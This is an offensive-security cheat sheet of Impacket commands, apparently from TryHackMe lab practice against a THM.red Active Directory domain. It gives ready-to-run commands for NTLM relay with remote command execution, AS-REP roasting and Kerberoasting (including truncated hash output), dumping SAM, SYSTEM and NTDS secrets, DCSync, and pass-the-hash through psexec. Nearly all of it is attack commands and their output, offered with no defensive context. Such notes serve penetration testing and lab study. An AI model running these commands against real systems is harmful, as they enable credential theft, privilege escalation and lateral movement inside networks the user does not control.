// Impacket - Docker install
```
git clone https://github.com/fortra/impacket.git
cd impacket
docker build -t "impacket:latest" .
```

// Impacket - Run docker container with binded share folder from local desktop
```  
docker run -it --rm -v ~/Desktop/share:/shared impacket:latest
```

// Impacket - Enumerate SIDs
```
impacket-lookupsid anonymous@10.10.10.10
```
// Impacket - NTLM relay
```
impacket-ntlmrelayx -smb2support -t smb://10.10.10.10 -c 'whoami /all' -debug
```

// Impacket - ASREProast
```
impacket-GetNPUsers contoso.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
```

// Impacket - Create share  (not MacOS)
```  
smbserver.py -smb2support -username <user> -password <password> <share name> <path to share>
```

// Impacket/Linux - Set perms on shared files
```  
chmod +r ~/Desktop/share/sam.hive
chmod +r ~/Desktop/share/system.hive   
```  

// Impacket - Secrets Dump
```  
secretsdump.py -sam sam.hive -system system.hive LOCAL
```  

// Impacket - Pass the hash  
```  
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a8
4d07b0e3b34f5::: administrator@x.x.x.x
```  

// Impacket - extract hashes from ntds files
```
secretsdump.py -security ~/SECURITY -system ~/SYSTEM -ntds ~/ntds.dit local
```
// Impacket - DC Sync attack just NTDS data
```
secretsdump.py -just-dc THM.red/<AD_Admin_User>@x.x.x.x
```

// Impacket - DC Sync Just NTLM data
```
secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@x.x.x.x
```

// Impacket - Enumerate SPN users
```
GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never> 
```

// Impacket - Request TGS Ticket as SPN account
```
GetUserSPNs.py -dc-ip 10.10.117.9 THM.red/thm -request-user svc-thm
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$...
```

// Performing an AS-REP Roasting Attack against Users List
```
GetNPUsers.py -dc-ip 10.10.117.9 thm.red/ -usersfile /tmp/users.txt
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

$krb5asrep$23$victim@THM.RED:...

```
